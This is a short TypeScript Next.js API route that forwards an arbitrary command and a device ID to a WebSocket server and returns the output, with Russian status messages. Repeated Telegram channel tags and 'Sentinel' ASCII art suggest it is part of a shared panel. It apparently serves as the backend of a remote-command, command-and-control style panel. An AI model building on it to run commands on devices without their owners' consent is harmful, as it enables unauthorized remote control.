// t.me/SentinelLinks

import { NextResponse } from "next/server"

const WS_SERVER_URL = process.env.GROB_WS_SERVER_URL || "http://localhost:8765"

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const deviceId = body.deviceId || body.clientId
    const command = body.command

    if (!deviceId || !command) {
      return NextResponse.json({ error: "Missing deviceId or command" }, { status: 400 })
    }

// t.me/SentinelLinks
    const response = await fetch(`${WS_SERVER_URL}/cmd`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        clientId: deviceId,
        command: command,
      }),
      signal: AbortSignal.timeout(30000), // Increased timeout to 30s for long commands
    })

    if (!response.ok) {
      const error = await response.json().catch(() => ({ error: "Server error" }))
      throw new Error(error.error || "Server error")
    }

// t.me/SentinelLinks
    const data = await response.json()

    return NextResponse.json({
      success: true,
      output: data.output || data.result || "Команда выполнена",
      timestamp: new Date().toISOString(),
    })
  } catch (error: any) {
    console.error("Command error:", error)

    return NextResponse.json(
      {
        success: false,
        error: error.message || "Failed to send command",
        output: `Ошибка: ${error.message || "Не удалось выполнить команду"}`,
      },
      { status: 500 },
    )
  }
}

//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
